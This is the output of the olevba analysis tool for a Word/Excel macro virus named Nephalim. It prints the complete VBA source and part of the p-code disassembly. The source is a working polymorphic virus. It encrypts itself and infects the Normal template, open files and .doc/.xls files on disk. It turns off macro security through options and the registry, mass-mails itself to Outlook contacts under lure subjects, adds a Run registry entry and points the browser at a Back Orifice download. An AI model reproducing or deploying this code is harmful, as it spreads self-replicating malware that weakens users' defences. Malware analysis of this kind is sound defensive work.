olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nephalim
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nephalim - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Nephalim v0.93  --  Pre-release version.
'
' Known issues in this release:
'   -Instability on Excel platform
'
Private Sub fDeleteFile(sFileName As String)
On Error Resume Next
If Dir(sFileName) <> "" Then
SetAttr sFileName, 0
Kill sFileName
End If
End Sub
Private Function CreateKey()
On Error Resume Next
Dim iTemp As Integer, sKey As String
sKey = ""
For iTemp = 1 To Int((30 * Rnd) + 6): sKey = sKey + Chr(Int((122 - 65) * Rnd) + 65): Next iTemp
CreateKey = sKey
End Function
Private Function fExposedEngine(sTargetApp As String, sKey As String, iLineCount As Integer)
On Error Resume Next
Dim var(20) As String, eol(20) As String, bond(20) As String, proc_declare(20) As String
Dim sEngine1 As String, sEngine2 As String, sEngine3 As String
Randomize
sTemp = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
For iTemp = 1 To 20
poz = Int(Rnd * Len(sTemp)) + 1
var(iTemp) = Mid(sTemp, poz, 1)
sTemp = Left(sTemp, poz - 1) + Right(sTemp, Len(sTemp) - poz)
Select Case Int((4 * Rnd) + 1)
Case 1: bond(iTemp) = ": "
eol(iTemp) = vbLf & vbLf & vbLf
proc_declare(iTemp) = ""
Case 2: bond(iTemp) = vbLf
eol(iTemp) = vbLf
proc_declare(iTemp) = "Private "
Case 3: bond(iTemp) = vbLf & vbLf
eol(iTemp) = vbLf & vbLf
proc_declare(iTemp) = "Public "
Case 4: bond(iTemp) = ": Rem " & CreateKey & vbLf
eol(iTemp) = vbLf & vbLf & vbLf
proc_declare(iTemp) = ""
End Select
Next iTemp
iSplitNumber1 = 130
iSplitNumber1A = Int(Rnd * iSplitNumber1)
iSplitNumber1B = iSplitNumber1 - iSplitNumber1A
iSplitNumber2 = 32
iSplitNumber2A = Int(Rnd * iSplitNumber2)
iSplitNumber2B = iSplitNumber2 - iSplitNumber2A
iSplitNumber3 = iLineCount
iSplitNumber3A = Int(Rnd * iSplitNumber3)
iSplitNumber3B = iSplitNumber3 - iSplitNumber3A
sObject = var(9) & ".VBProject.VBComponents.Item(" & var(16) & ").CodeModule."
iTemp = Int(Rnd * Len(sObject)) + 1
poz = InStr(iTemp, sObject, ".")
sOne = Left(sObject, poz - 1)
sTwo = Right(sObject, Len(sObject) - poz + 1)
sSplitObject1A = "set " & var(10) & " = " & sOne
sSplitObject1B = var(10) & sTwo
sObject = "VBProject.VBComponents.Item(1).CodeModule."
iTemp = Int(Rnd * Len(sObject)) + 1
poz = InStr(iTemp, sObject, ".")
sOne = Left(sObject, poz - 1)
sTwo = Right(sObject, Len(sObject) - poz + 1)
sSplitObject2A = "set " & var(13) & " = " & sOne
sSplitObject2B = var(13) & sTwo
sEngine1 = _
"Private Sub " & var(14) & "()" & bond(1) & _
"On Error Resume Next" & bond(2)
Select Case sTargetApp
Case "Excel":  sEngine1 = sEngine1 & _
"Dim " & var(9) & " As Excel.Workbook" & bond(3) & _
"Set " & var(9) & " = Excel.Workbooks.Add" & bond(4) & _
var(16) & " = 4" & bond(5)
Case "Word":  sEngine1 = sEngine1 & _
"Dim " & var(9) & " As Word.Document" & bond(3) & _
"Set " & var(9) & " = Word.Documents.Add" & bond(4) & _
var(16) & " = 1" & bond(5)
End Select
sEngine1 = sEngine1 & _
sSplitObject1A & bond(6) & _
sSplitObject2A & bond(7) & _
var(11) & " = (" & iSplitNumber1A & "+" & iSplitNumber1B & ")" & bond(8) & _
var(12) & " = (" & iSplitNumber2A & "+" & iSplitNumber2B & ")" & bond(9) & _
"For " & var(1) & " = 1 To " & iSplitNumber3A & "+" & iSplitNumber3B & eol(10) & _
var(5) & " = " & sSplitObject2B & "lines(" & var(1) & ", 1)" & bond(11) & _
var(5) & " = right(" & var(5) & ",len(" & var(5) & ")-1)" & bond(12) & _
var(4) & " = """"" & bond(13) & _
var(3) & " = 0" & bond(14) & _
"For " & var(2) & " = 1 To Len(" & var(5) & ")" & eol(15) & _
var(3) & " = " & var(3) & " + 1" & eol(16) & _
"If " & var(3) & " > " & Len(sKey) & "Then " & var(3) & " = 1" & eol(1) & _
var(6) & " = Asc(Mid(" & var(5) & ", " & var(2) & ", 1))" & eol(17) & _
"If " & var(6) & " >= " & var(12) & " And " & var(6) & " <= " & var(11) & " Then" & eol(18)
sEngine2 = _
var(8) & " = Asc(Mid(""" & sKey & """, " & var(3) & ", 1))" & bond(19)
sEngine3 = _
"If " & var(8) & " > (" & var(11) & "-" & var(12) & ") Then " & var(8) & " = " & var(8) & " - (" & var(11) & "-" & var(12) & ")" & eol(20) & _
var(7) & " = " & var(6) & " - " & var(8) & bond(1) & _
"If " & var(7) & " < " & var(12) & " Then " & var(7) & " = " & var(11) & " - (" & var(12) & " - " & var(7) & ")" & eol(2) & _
"Else" & eol(3)
sEngine3 = sEngine3 & _
var(7) & " = " & var(6) & bond(4) & _
"End If" & bond(5) & _
var(4) & " = " & var(4) & " & Chr(" & var(7) & ")" & bond(6) & _
"Next " & var(2) & eol(7) & _
var(18) & " = InStr(" & var(4) & ", "":NP" & "R"") - 1" & bond(3) & _
"If " & var(18) & " <> 0 then " & var(4) & " = Left(" & var(4) & "," & var(18) & ")" & eol(4) & _
"If Left(" & var(4) & ", 3) <> ""'NP"" then " & var(17) & "=" & var(17) & " & " & var(4) & " & vbLf" & eol(2) & _
"Next " & var(1) & bond(9) & _
sSplitObject1B & "InsertLines " & 1 & ", " & var(17) & bond(1) & _
var(9) & ".close(False)" & bond(10) & _
"End Sub" & vbLf
sEngine3 = sEngine3 & _
proc_declare(1) & "Sub Document_Open () " & bond(12) & _
var(14) & eol(13) & _
"End Sub" & vbLf & _
proc_declare(2) & "Sub Workbook_Open () " & bond(15) & _
var(14) & eol(16) & _
"End Sub" & vbLf
fExposedEngine = sEngine1 & sEngine2 & sEngine3
End Function
Private Function fEncrypt(iDirection As Integer, sKey As String, sInput As String) As String
On Error Resume Next
Dim sTemp As String, iChr As Integer, iKey As Integer, iTemp As Integer, i As Integer, j As Integer
sTemp = "": j = 0
For i = 1 To Len(sInput)
j = j + 1: If j > Len(sKey) Then j = 1
iChr = Asc(Mid(sInput, i, 1))
If iChr >= 32 And iChr <= 130 Then
iKey = Asc(Mid(sKey, j, 1))
If iKey > (130 - 32) Then iKey = iKey + (32 - 130)
iTemp = iChr + iDirection * iKey
If iTemp > 130 Then iTemp = 32 + (iTemp - 130)
If iTemp < 32 Then iTemp = 130 - (32 - iTemp)
Else
iTemp = iChr
End If
sTemp = sTemp & Chr(iTemp)
Next i
fEncrypt = sTemp
End Function
Private Sub fTouchFile(dTargetApplication As String, dSource As Object, dTarget As String)
On Error Resume Next
Dim iTemp As Integer, sMKey As String
sMKey = CreateKey
fDeleteFile (dTarget)
Open dTarget For Output As #1
For iTemp = 1 To dSource.CountOfLines: Print #1, "'" & fEncrypt(1, sMKey, dSource.Lines(iTemp, 1)): Next iTemp
Print #1, fExposedEngine(dTargetApplication, sMKey, dSource.CountOfLines)
Close #1
End Sub
Private Sub fTouch(dSource As Object, dTarget As Object)
On Error Resume Next
Dim iTemp As Integer, sMKey As String, sTarget As String
Dim sExtractedKey As String, sFirstLine As String
Dim buffer_lines As Integer
Select Case Application.Name
Case "Microsoft Word": sTarget = "Word"
Case "Microsoft Excel": sTarget = "Excel"
End Select
With dTarget
If .CountOfLines > 0 Then
sTemp = .Lines(1, .CountOfLines)
sFirstLine = .Lines(1, 1)
poz1 = InStr(1, sTemp, "Asc(Mid(""")
poz2 = InStr(poz1, sTemp, "))") - poz1
sExtractedKey = Mid(sTemp, poz1, poz2)
poz1 = InStr(1, sExtractedKey, """") + 1
poz2 = InStr(poz1, sExtractedKey, """") - poz1
sExtractedKey = Mid(sExtractedKey, poz1, poz2)
sFirstLine = fEncrypt(-1, sExtractedKey, Right(sFirstLine, Len(sFirstLine) - 1))
End If
bAlreadyTouched = (InStr(1, sFirstLine, "Nephalim v0") > 0)
End With
Randomize
buffer_lines = 0
If Not bAlreadyTouched Then
sMKey = CreateKey
With dTarget
.DeleteLines 1, .CountOfLines
For iTemp = 1 To dSource.CountOfLines
If Len(Trim(dSource.Lines(iTemp, 1))) <> 0 Then
sPostBuffer = ""
If Int(Rnd * 3) + 1 = 1 Then sPostBuffer = ":NP" & "R " & CreateKey
.AddFromString "'" & fEncrypt(1, sMKey, Trim(dSource.Lines(iTemp, 1)) & sPostBuffer)
buffer_lines = buffer_lines + 1
End If
If Int(Rnd * 3) + 1 = 1 Then
sTemp = ""
For iTemp2 = 1 To Int(Rnd * 3) + 1: sTemp = sTemp & CreateKey: Next iTemp2
.AddFromString "'" & fEncrypt(1, sMKey, "'NP" & sTemp)
buffer_lines = buffer_lines + 1
End If
Next iTemp
.AddFromString fExposedEngine(sTarget, sMKey, buffer_lines)
End With
End If
End Sub
Private Sub fActiveSpawn()
On Error Resume Next
Dim iTemp As Integer, iTemp2 As Integer
Dim oPersonal As Object
fTouch VBProject.VBComponents.Item(1).CodeModule, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set oPersonal = Workbooks.Add
fTouch VBProject.VBComponents.Item(1).CodeModule, oPersonal.VBProject.VBComponents.Item(1).CodeModule
For iTemp = 1 To Documents.Count
If Documents.Item(iTemp).Name <> ActiveDocument.Name Then fTouch VBProject.VBComponents.Item(1).CodeModule, Documents.Item(iTemp).VBProject.VBComponents.Item(1).CodeModule
Next iTemp
For iTemp = 1 To Workbooks.Count
If Workbooks.Item(iTemp).Name <> ActiveWorkbook.Name Then
For iTemp2 = 1 To Workbooks.Item(iTemp).VBProject.VBComponents.Count
With Workbooks.Item(iTemp).VBProject.VBComponents.Item(iTemp2)
Err.Clear
sTemp = .Properties.Item("Saved").Name
If Err.Number = 0 Then fTouch VBProject.VBComponents.Item(1).CodeModule, Workbooks.Item(iTemp).VBProject.VBComponents.Item(iTemp2).CodeModule
End With
Next iTemp2
End If
Next iTemp
End Sub
Private Sub fWordFileGrab(sFileName As String)
Dim dFSTarget As Word.Document
If LCase(sFileName) <> LCase(ActiveDocument.FullName) Then
Set dFSTarget = Documents.Open(sFileName)
fTouch VBProject.VBComponents.Item(1).CodeModule, dFSTarget.VBProject.VBComponents.Item(1).CodeModule
dFSTarget.Save
dFSTarget.Close
End If
End Sub
Private Sub fExcelFileGrab(sFileName As String)
Dim dFSTarget As Excel.Workbook
If LCase(sFileName) <> LCase(ActiveWorkbook.FullName) Then
Set dFSTarget = Workbooks.Open(sFileName)
fTouch VBProject.VBComponents.Item(1).CodeModule, dFSTarget.VBProject.VBComponents.Item(1).CodeModule
dFSTarget.Save
dFSTarget.Close
End If
End Sub
Private Sub fDirectorySpawn()
On Error Resume Next
Dim sSearchDir As String, sBeenThere As String, sKey As String, sSearchDirs As String
Dim iPoz As Integer, iTemp As Integer
Dim objFileSearch As Object
sSearchDirs = "C:\|C:\windows\desktop\|C:\my documents|C:\Program Files\Microsoft Office\Office\XLSTART|"
sSearchDirs = sSearchDirs & Options.DefaultFilePath(14) & "|" & Options.DefaultFilePath(0) & "|"
sSearchDirs = sSearchDirs & ActiveDocument.Path & "|" & Left(ActiveDocument.Path, 3) & "|"
sSearchDirs = sSearchDirs & ActiveWorkbook.Path & "|" & Left(ActiveWorkbook.Path, 3) & "|"
sBeenThere = ""
Do While sSearchDirs <> ""
iPoz = InStr(sSearchDirs, "|")
sSearchDir = Left(sSearchDirs, iPoz - 1)
sSearchDirs = Right(sSearchDirs, Len(sSearchDirs) - iPoz)
If Right(Trim(sSearchDir), 1) <> "\" Then sSearchDir = Trim(sSearchDir) + "\"
If InStr(sBeenThere, LCase(sSearchDir)) = 0 Then
Set objFileSearch = Application.FileSearch
With objFileSearch
.LookIn = sSearchDir
Select Case Application.Name
Case "Microsoft Word": .FileName = "*.doc"
Case "Microsoft Excel": .FileName = "*.xls"
Case Else: .FileName = "*.vbs"
End Select
If .Execute(SortBy:=msoSortByFileName, SortOrder:=msoSortOrderAscending) > 0 Then
For iTemp = 1 To .FoundFiles.Count
Select Case Application.Name
Case "Microsoft Word": fWordFileGrab (.FoundFiles(iTemp))
Case "Microsoft Excel": fExcelFileGrab (.FoundFiles(iTemp))
End Select
Next iTemp
End If
End With
sBeenThere = sBeenThere & "{" & LCase(sSearchDir) & "}"
End If
Loop
Set objFileSearch = Nothing
End Sub
Private Sub fStealth(iSetting As Integer)
On Error Resume Next
With Application
.CommandBars("Visual Basic").Enabled = iSetting
.CommandBars("Macro").Controls("Security...").Enabled = iSetting
.CommandBars("Window").Controls("Unhide").Enabled = iSetting
With .CommandBars("Tools"): .Controls("Macro").Enabled = iSetting: .Controls("Customize...").Enabled = iSetting: .Controls("Templates and Add-Ins...").Enabled = iSetting: End With
With .Options: .VirusProtection = iSetting: .SaveNormalPrompt = iSetting: .ConfirmConversions = iSetting: End With
End With
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security", "Level") = 1&
End Sub
Private Sub fGrabJugular(sApplication As String)
On Error Resume Next
Dim sInputFile As String, sTemplateFile As String, sCommand As String
Dim lExternal As Long
Dim objApp As Object
Dim iTemp As Integer
sInputFile = "C:\TEST.TXT"
fTouchFile sApplication, VBProject.VBComponents.Item(1).CodeModule, sInputFile
sTemplateFile = "C:\Program Files\Microsoft Office\Office\XLSTART\personal.xls"
If sApplication = "Excel" Then fDeleteFile sTemplateFile
For iTemp = 1 To 10
Set objApp = GetObject(, sApplication & ".Application")
objApp.Application.ActiveDocument.Close (False)
objApp.Application.ActiveWorkbook.Close (False)
objApp.Application.Quit
Next iTemp
If sApplication = "Excel" Then
sCommand = "EXCEL.EXE"
ElseIf sApplication = "Word" Then
sCommand = "WINWORD.EXE"
End If
lExternal = Shell(sCommand, vbNormalFocus)
AppActivate lExternal
AppActivate lExternal
AppActivate lExternal
If sApplication = "Excel" Then
SendKeys "~~~ {Down} ~~~", True
SendKeys "%{F11}", True
SendKeys "%VP%VP%VP", True
SendKeys "^R^R^R", True
SendKeys "{PgDn}{PgDn}{PgDn}", True
SendKeys "{F7}", True
SendKeys "%IL", True
SendKeys sInputFile & "~", True
ElseIf sApplication = "Word" Then
SendKeys "123{Down}", True
SendKeys "%{F11}", True
SendKeys "%VP^R^R^R", True
SendKeys "{F7}", True
SendKeys "^+{End}", True
SendKeys "^A^A^A", True
SendKeys "{Del}{Del}{Del}", True
SendKeys "%IL", True
SendKeys sInputFile & "~", True
End If
Err.Clear
Set objApp = GetObject(, sApplication & ".Application")
For iTemp = 1 To 15
If Err.Number <> 0 Then Set objApp = GetObject(, sApplication & ".Application")
Next iTemp
If Err.Number = 0 Then
objApp.Application.Visible = False
objApp.Application.ActiveDocument.Close (False)
objApp.Application.ActiveWorkbook.SaveAs sTemplateFile
objApp.Application.ActiveWorkbook.Close (False)
objApp.Application.Quit
Else
If sApplication = "Excel" Then
SendKeys "%{F4}", True
SendKeys "%F", True
SendKeys "^S^S^S", True
SendKeys sTemplateFile & "~", True
SendKeys "%{F4}N", True
ElseIf sApplication = "Word" Then
SendKeys "%{F4}", True
SendKeys "%{F4}NY", True
End If
End If
fDeleteFile sInputFile
Set objApp = Nothing
End Sub
Private Sub HaveOutlook() 'will travel...
On Error Resume Next
Dim oApplication As Object, oMAPI As Object, oContact As Object, oMessage As Object, oRecipient As Object
Dim sSubject As String, sBody As String
Dim bDoneThat As Boolean
Randomize
On Error GoTo skip_outlook
Set oApplication = CreateObject("Outlook.Application")
Set oMAPI = oApplication.GetNamespace("MAPI")
Select Case Int((15 * Rnd) + 1)
Case 1: sSubject = "Here's " & ActiveDocument.Name: sBody = "Hope this helps." & vbCr & vbLf & vbCr & vbLf & "    " & Application.UserName
Case 2: sSubject = "Hope this is what you wanted...": sBody = "I've attached " & ActiveDocument.Name & ".  Let me know if there's a problem."
Case 3: sSubject = "Hey John, check this out [private]": sBody = "(Make sure you don't show anyone else)"
Case 4: sSubject = "Check out these sitez! {personal}": sBody = "Don't stay up TOO late checking these out :-)"
Case 5: sSubject = "The report you requested": sBody = "If this isn't the right one, let me know." & vbCr & vbLf & vbCr & vbLf & "    " & Application.UserName
Case 6: sSubject = "Check out these babes!": sBody = "You know the score, passwords to the latest batch of sites enclosed (courtesy of FoG)" & vbCr & vbLf & vbCr & vbLf & "(Check out the girl on the entrance to site number 3...)"
Case 7: sSubject = "New computer question...": sBody = "Does this look right?  New PIII for $600?  What's missing from it?"
Case 8: sSubject = "That report...": sBody = "Here's " & ActiveDocument.Name & ".  This was what you wanted?  Call me if it isn't..."
Case 9: sSubject = "...": sBody = "Free porn site passwords!"
Case 10: sSubject = "IMPORTANT: virus alert": sBody = "Do we need to be worried?" & vbCr & vbLf & vbCr & vbLf & "    " & Application.UserName
Case 11: sSubject = "Latest round of Bill Gates jokes...": sBody = "Joke 4 nearly gave me a heart attack, I laughed so hard!!"
Case 12: sSubject = "<attachment>": sBody = "Here's " & ActiveDocument.Name & ", I hope this was the one you wanted."
Case 13: sSubject = "Microsoft Office 2000 code crack!": sBody = "I've attached the serial number, and FTP site/password.  Don't want to be caught out by Y2K (or spend $1300 either!)"
Case 14: sSubject = "Pictures": sBody = "Here are those pictures of me you wanted -- enjoy ;).  I've put them in Word format, the password is 'LUVMYBODY'."
Case 15: sSubject = "New Windows Internet hack found!": sBody = "Check this out, do you think it's for real?"
End Select
If Minute(Now) < 15 Then
For Each oContact In oMAPI.GetDefaultFolder(10).Items
Set oMessage = oApplication.CreateItem(0)
Set oRecipient = oMessage.Recipients.Add(oContact.Email1Address)
If bDoneThat Then oRecipient.Type = 3
oRecipient.Resolve
bDoneThat = True
oMessage.Subject = sSubject
oMessage.Body = sBody
oMessage.Attachments.Add Documents(1).FullName
oMessage.Send
Next oContact
Else
bDoneThat = False
Set oMessage = oApplication.CreateItem(0)
For Each oContact In oMAPI.GetDefaultFolder(10).Items
Set oRecipient = oMessage.Recipients.Add(oContact.Email1Address)
If bDoneThat Then oRecipient.Type = 3
oRecipient.Resolve
bDoneThat = True
Next oContact
oMessage.Subject = sSubject
oMessage.Body = sBody
oMessage.Attachments.Add Documents(1).FullName
oMessage.Send
End If
skip_outlook:
End Sub
Private Sub main()
On Error Resume Next
Randomize
fStealth 0
Select Case Int(Rnd * 2) + 1
Case 1: fActiveSpawn
Case 2: fDirectorySpawn
End Select
If (Day(Now) = 18 And Month(Now) = 5) Then Selection.TypeText (vbCr & vbLf & "========" & vbCr & vbLf & "Love has torn us apart... " & (Year(Now) - 1980) & " years..." & vbCr & vbLf & "========" & vbCr & vbLf & vbCr & vbLf)
Select Case (Int(Rnd * 11) + 2)
Case 2: If Application.Name <> "Microsoft Excel" Then fGrabJugular ("Excel")
If Application.Name <> "Microsoft Word" Then fGrabJugular ("Word")
Case 3: If (Minute(Now) < Second(Now)) Or (Day(Now) = 18) Then HaveOutlook
Case 4: Select Case (Int(Rnd * 6) + 1)
Case 1: For iTemp = 1 To 5: Shell "ping -t ftp.nai.com", vbHide: Next iTemp
Case 2: System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", Chr(255)) = "C:\WINDOWS\WINMINE.EXE"
Case 3: Shell "explorer http://www.nephilim.com/"
Case 4: Shell "explorer http://www.bo2k.com/warez/bo2k_1.0.exe"
End Select
End Select
End Sub
Private Sub Document_Close(): main: End Sub
Private Sub Workbook_BeforeClose(Cancel As Boolean): main: End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Nephalim
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 31353 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0029 " Nephalim v0.93  --  Pre-release version."
' Line #1:
' 	QuoteRem 0x0000 0x0000 ""
' Line #2:
' 	QuoteRem 0x0000 0x001E " Known issues in this release:"
' Line #3:
' 	QuoteRem 0x0000 0x0021 "   -Instability on Excel platform"
' Line #4:
' 	QuoteRem 0x0000 0x0000 ""
' Line #5:
' 	FuncDefn (Private Sub fDeleteFile(sFileName As String))
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' 	Ld sFileName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #8:
' 	Ld sFileName 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #9:
' 	Ld sFileName 
' 	ArgsCall Kill 0x0001 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Private Function CreateKey(id_FFFE As Variant))
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' 	Dim 
' 	VarDefn iTemp (As Integer)
' 	VarDefn sKey (As String)
' Line #15:
' 	LitStr 0x0000 ""
' 	St sKey 
' Line #16:
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0006 
' 	Add 
' 	FnInt 
' 	For 
' 	BoS 0x0000 
' 	Ld sKey 
' 	LitDI2 0x007A 
' 	LitDI2 0x0041 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sKey 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	NextVar 
' Line #17:
' 	Ld sKey 
' 	St CreateKey 
' Line #18:
' 	EndFunc 
' Line #19:
' 	FuncDefn (Private Function fExposedEngine(sTargetApp As String, sKey As String, iLineCount As Integer, id_FFFE As Variant))
' Line #20:
' 	OnError (Resume Next) 
' Line #21:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0014 
' 	VarDefn var (As String)
' 	OptionBase 
' 	LitDI2 0x0014 
' 	VarDefn eol (As String)
' 	OptionBase 
' 	LitDI2 0x0014 
' 	VarDefn bond (As String)
' 	OptionBase 
' 	LitDI2 0x0014 
' 	VarDefn proc_declare (As String)
' Line #22:
' 	Dim 
' 	VarDefn sEngine1 (As String)
' 	VarDefn sEngine2 (As String)
' 	VarDefn sEngine3 (As String)
' Line #23:
' 	ArgsCall Read 0x0000 
' Line #24:
' 	LitStr 0x001A "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
' 	St sTemp 
' Line #25:
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	For 
' Line #26:
' 	Ld Rnd 
' 	Ld sTemp 
' 	FnLen 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St poz 
' Line #27:
' 	Ld sTemp 
' 	Ld poz 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld iTemp 
' 	ArgsSt var 0x0001 
' Line #28:
' 	Ld sTemp 
' 	Ld poz 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld sTemp 
' 	Ld sTemp 
' 	FnLen 
' 	Ld poz 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Add 
' 	St sTemp 
' Line #29:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	SelectCase 
' Line #30:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0002 ": "
' 	Ld iTemp 
' 	ArgsSt bond 0x0001 
' Line #31:
' 	Ld vbLf 
' 	Ld vbLf 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	Ld iTemp 
' 	ArgsSt eol 0x0001 
' Line #32:
' 	LitStr 0x0000 ""
' 	Ld iTemp 
' 	ArgsSt proc_declare 0x0001 
' Line #33:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld vbLf 
' 	Ld iTemp 
' 	ArgsSt bond 0x0001 
' Line #34:
' 	Ld vbLf 
' 	Ld iTemp 
' 	ArgsSt eol 0x0001 
' Line #35:
' 	LitStr 0x0008 "Private "
' 	Ld iTemp 
' 	ArgsSt proc_declare 0x0001 
' Line #36:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld vbLf 
' 	Ld vbLf 
' 	Concat 
' 	Ld iTemp 
' 	ArgsSt bond 0x0001 
' Line #37:
' 	Ld vbLf 
' 	Ld vbLf 
' 	Concat 
' 	Ld iTemp 
' 	ArgsSt eol 0x0001 
' Line #38:
' 	LitStr 0x0007 "Public "
' 	Ld iTemp 
' 	ArgsSt proc_declare 0x0001 
' Line #39:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0006 ": Rem "
' 	Ld CreateKey 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	Ld iTemp 
' 	ArgsSt bond 0x0001 
' Line #40:
' 	Ld vbLf 
' 	Ld vbLf 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	Ld iTemp 
' 	ArgsSt eol 0x0001 
' Line #41:
' 	LitStr 0x0000 ""
' 	Ld iTemp 
' 	ArgsSt proc_declare 0x0001 
' Line #42:
' 	EndSelect 
' Line #43:
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' 	LitDI2 0x0082 
' 	St iSplitNumber1 
' Line #45:
' 	Ld Rnd 
' 	Ld iSplitNumber1 
' 	Mul 
' 	FnInt 
' 	St iSplitNumber1A 
' Line #46:
' 	Ld iSplitNumber1 
' 	Ld iSplitNumber1A 
' 	Sub 
' 	St iSplitNumber1B 
' Line #47:
' 	LitDI2 0x0020 
' 	St iSplitNumber2 
' Line #48:
' 	Ld Rnd 
' 	Ld iSplitNumber2 
' 	Mul 
' 	FnInt 
' 	St iSplitNumber2A 
' Line #49:
' 	Ld iSplitNumber2 
' 	Ld iSplitNumber2A 
' 	Sub 
' 	St iSplitNumber2B 
' Line #50:
' 	Ld iLineCount 
' 	St iSplitNumber3 
' Line #51:
' 	Ld Rnd 
' 	Ld iSplitNumber3 
' 	Mul 
' 	FnInt 
' 	St iSplitNumber3A 
' Line #52:
' 	Ld iSplitNumber3 
' 	Ld iSplitNumber3A 
' 	Sub 
' 	St iSplitNumber3B 
' Line #53:
' 	LitDI2 0x0009 
' 	ArgsLd var 0x0001 
' 	LitStr 0x001D ".VBProject.VBComponents.Item("
' 	Concat 
' 	LitDI2 0x0010 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x000D ").CodeModule."
' 	Concat 
' 	St sObject 
' Line #54:
' 	Ld Rnd 
' 	Ld sObject 
' 	FnLen 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St iTemp 
' Line #55:
' 	Ld iTemp 
' 	Ld sObject 
' 	LitStr 0x0001 "."
' 	FnInStr3 
' 	St poz 
' Line #56:
' 	Ld sObject 
' 	Ld poz 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St sOne 
' Line #57:
' 	Ld sObject 
' 	Ld sObject 
' 	FnLen 
' 	Ld poz 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Right 0x0002 
' 	St sTwo 
' Line #58:
' 	LitStr 0x0004 "set "
' 	LitDI2 0x000A 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld sOne 
' 	Concat 
' 	St sSplitObject1A 
' Line #59:
' 	LitDI2 0x000A 
' 	ArgsLd var 0x0001 
' 	Ld sTwo 
' 	Concat 
' 	St sSplitObject1B 
' Line #60:
' 	LitStr 0x002A "VBProject.VBComponents.Item(1).CodeModule."
' 	St sObject 
' Line #61:
' 	Ld Rnd 
' 	Ld sObject 
' 	FnLen 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St iTemp 
' Line #62:
' 	Ld iTemp 
' 	Ld sObject 
' 	LitStr 0x0001 "."
' 	FnInStr3 
' 	St poz 
' Line #63:
' 	Ld sObject 
' 	Ld poz 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St sOne 
' Line #64:
' 	Ld sObject 
' 	Ld sObject 
' 	FnLen 
' 	Ld poz 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Right 0x0002 
' 	St sTwo 
' Line #65:
' 	LitStr 0x0004 "set "
' 	LitDI2 0x000D 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld sOne 
' 	Concat 
' 	St sSplitObject2A 
' Line #66:
' 	LitDI2 0x000D 
' 	ArgsLd var 0x0001 
' 	Ld sTwo 
' 	Concat 
' 	St sSplitObject2B 
' Line #67:
' 	LineCont 0x0008 02 00 00 00 10 00 00 00
' 	LitStr 0x000C "Private Sub "
' 	LitDI2 0x000E 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0002 "()"
' 	Concat 
' 	LitDI2 0x0001 
